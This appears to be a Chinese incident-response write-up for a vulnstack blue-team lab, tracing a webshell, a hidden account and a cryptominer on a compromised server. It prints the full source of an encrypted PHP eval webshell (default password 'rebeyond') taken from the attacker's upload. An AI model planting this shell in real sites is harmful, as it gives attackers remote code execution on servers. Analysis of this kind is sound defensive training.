---

title: ATT&CK实战系列——蓝队防御（一）
date: 2026-03-16
categories:
  - 应急响应
tags:
  - 渗透靶场

---

# 环境搭建


项目地址：[http://vulnstack.qiyuanxuetang.net/vuln/detail/15/](http://vulnstack.qiyuanxuetang.net/vuln/detail/15/) 



## 相关账户密码
用户:administrator

密码:Zgsf@admin.com



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457960.png)





# <font style="color:rgb(33, 37, 41);">前景需要：</font>
<font style="color:rgb(33, 37, 41);">小李在值守的过程中，发现有CPU占用飙升，出于胆子小，就立刻将服务器关机，并找来正在吃苕皮的hxd帮他分析，这是他的服务器系统，请你找出以下内容，并作为通关条件：</font>

<font style="color:rgb(33, 37, 41);">1.攻击者的shell密码</font>

<font style="color:rgb(33, 37, 41);">2.攻击者的IP地址</font>

<font style="color:rgb(33, 37, 41);">3.攻击者的隐藏账户名称</font>

<font style="color:rgb(33, 37, 41);">4.攻击者挖矿程序的矿池域名(仅域名)</font>

<font style="color:rgb(33, 37, 41);">5.有实力的可以尝试着修复漏洞</font>

<font style="color:rgb(33, 37, 41);"></font>

<font style="color:rgb(33, 37, 41);"></font>

# <font style="color:rgb(33, 37, 41);">1.攻击者的shell密码</font>
找到日志文件进行分析：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457118.png)

分析日志：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457184.png)

```bash
──(xvsf?kali)-[~/tmp]
└─$ ls
access.log.1708905600
                                                                                                                                                             
┌──(xvsf?kali)-[~/tmp]
└─$ awk '{print $1,$7}' access.log.1708905600  | sort | uniq -c | grep -v '::1' | grep '.php'

   5740 192.168.126.1 /admin/account.php?action=dosignin&s=
      1 192.168.126.1 /admin/account.php?action=signin
      6 192.168.126.1 /admin/account.php?action=signin&err_login=1
      2 192.168.126.1 /admin/plugin.php
      3 192.168.126.1 /admin/plugin.php?action=active&plugin=tips/tips.php&token=2dac908ae2df3b0237dee7081da123d213176d24
     11 192.168.126.1 /admin/plugin.php?action=check_update
      2 192.168.126.1 /admin/plugin.php?action=del&plugin=tips/tips.php&token=2dac908ae2df3b0237dee7081da123d213176d24
      1 192.168.126.1 /admin/plugin.php?action=inactive&plugin=tips/tips.php&token=2dac908ae2df3b0237dee7081da123d213176d24
      3 192.168.126.1 /admin/plugin.php?action=upload_zip
      2 192.168.126.1 /admin/plugin.php?activate_del=1
      2 192.168.126.1 /admin/plugin.php?activate_install=1
      3 192.168.126.1 /admin/plugin.php?active=1
      1 192.168.126.1 /admin/plugin.php?error_e=1
      1 192.168.126.1 /admin/plugin.php?inactive=1
      2 192.168.126.1 /admin/upgrade.php?action=check_update
 142791 192.168.126.1 /content/plugins/tips/shell.php
      1 192.168.126.1 /content/plugins/tips/shell.php?888666=331
      1 192.168.126.1 /content/plugins/tips/shell.php?888666=395
      1 192.168.126.1 /content/plugins/tips/shell.php?888666=619
      1 192.168.126.1 /content/plugins/tips/shell.php?AMKhtlTTEMKCZN5T=VbN2ItDmt0cZsJ8nFYFjPG8JpJHhNyqg&NQxMQd88ByKdwKQF=5vlwUtyYSChArIsZ3ajO6Jxzx7vRJuHl&888666=XSXMdgEcy5mYZOn9L4RoWLbwYo9nTxgr&htdk7suOo2SdXKmV=10I1HotZgl6Y50OMPTZRfKOMV1oVbQky&pp4TqWAlQHyYQdb1=rFVrQrbQT3VMlwPZxrnKVOekDCUcVeiX
      1 192.168.126.1 /content/plugins/tips/shell.php?nzQbavYgN6ODoxF1=G65ASv8y3UvkREqS1BhtN8ZQ9rBOTuYm&YD2ZXadPSvHEOYc2=Mtp8qcxNdDLrUSDD7WH6NZB9LGuhPYLT&888666=7Sn1K3PXNdf2Fh0LymWfQDymalxp4ty1&Y0fAQLYotO6P9ZRM=dj3DhH6k3adKnymgE07L8YUSXjdkX4vx&pV8lXaCzdJhmssdK=V4VdNXaxzvxXLdkEB9DTv7Bqbg3qw92J
                                                                                                                                                             
┌──(xvsf?kali)-[~/tmp]
└─$ awk '{print $1}' access.log.1708905600  | sort | uniq -c                               
     75 ::1
 148632 192.168.126.1
                                                                                                                     
┌──(xvsf?kali)-[~/tmp]
└─$ 

```



得到攻击者 IP：192.168.126.1

并且上传了 shell 在：/content/plugins/tips/shell.php

shell.php:

```php
<?php
  @error_reporting(0);
session_start();
$key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
$_SESSION['k']=$key;
session_write_close();
$post=file_get_contents("php://input");
if(!extension_loaded('openssl'))
{
  $t="base64_"."decode";
  $post=$t($post."");

  for($i=0;$i<strlen($post);$i++) {
    $post[$i] = $post[$i]^$key[$i+1&15]; 
  }
}
else
{
  $post=openssl_decrypt($post, "AES128", $key);
}
$arr=explode('|',$post);
$func=$arr[0];
$params=$arr[1];
class C{public function __invoke($p) {eval($p."");}}
@call_user_func(new C(),$params);
?>

```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457649.png)





shell 密码：`rebeyond`

# <font style="color:rgb(33, 37, 41);">2.攻击者的IP地址</font>
通过日志分析得知：`**192.168.126.1**`

# <font style="color:rgb(33, 37, 41);">3.攻击者的隐藏账户名称</font>
分析隐藏账户

`Get-LocalUser`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457475.png)



很明显，隐藏账户名称就是：`hack168$`



# <font style="color:rgb(33, 37, 41);">4.攻击者挖矿程序的矿池域名(仅域名)</font>
挖矿程序会占用系统资源很高，但是在资源管理器并没有找到异常

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457862.png)



然后进入到攻击者注册的账户：

在这个用户的桌面发现了一个特殊的文件：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457817.png)

 

字符串中出现了 `zETH`、`eTh`、`BTC` 等，这进一步坐实了它与以太坊或比特币相关的挖矿行为。  

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458303.png)



对这个程序尝试解包、反编译：



解包：

```php
wget https://raw.githubusercontent.com/extremecoders-re/pyinstxtractor/master/pyinstxtractor.py

python3 pyinstxtractor.py Kuang.exe
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457723.png)



 反编译 ：

```php
git clone https://github.com/zrax/pycdc.git
cd pycdc && cmake . && make
# 编译完成后，使用它反编译提取出的主文件
./pycdc ../Kuang.exe_extracted/Kuang.pyc 
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457978.png)





域名就是：`wakuang.zhigongshanfang.top`







# <font style="color:rgb(33, 37, 41);">提交</font>
> 最后一个正确的话，解题程序就自动关闭了
>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457615.png)

<font style="color:rgb(33, 37, 41);"></font>

<font style="color:rgb(33, 37, 41);"></font>

<font style="color:rgb(33, 37, 41);"></font>

<font style="color:rgb(33, 37, 41);"></font>

